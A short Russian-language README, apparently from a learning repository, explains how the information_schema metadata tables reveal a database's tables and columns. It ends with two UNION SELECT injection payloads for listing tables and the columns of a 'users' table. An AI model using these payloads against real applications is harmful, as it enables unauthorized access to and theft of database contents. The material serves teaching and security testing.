SQL injection

Этот репозиторий содержит практические примеры использования information_schema для обнаружения структуры базы данных во время SQL-инъекций.

📂 Что такое information_schema?
information_schema — это встроенная мета-база данных, которая содержит информацию о:

всех таблицах (information_schema.tables)

всех столбцах (information_schema.columns)

типах данных и других свойствах

📌 Полезные запросы

📄 Получить все таблицы в текущей базе данных:

SELECT table_name 
FROM information_schema.tables 
WHERE table_schema = 'имя_бд';

📄 Получить все столбцы из таблицы:

SELECT column_name, data_type 
FROM information_schema.columns 
WHERE table_name = 'имя_таблицы';

🛠 Применение в SQL-инъекциях
Используя UNION SELECT, можно вытянуть таблицы и столбцы даже без знания структуры базы данных:

' UNION SELECT table_name, NULL FROM information_schema.tables--

' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--

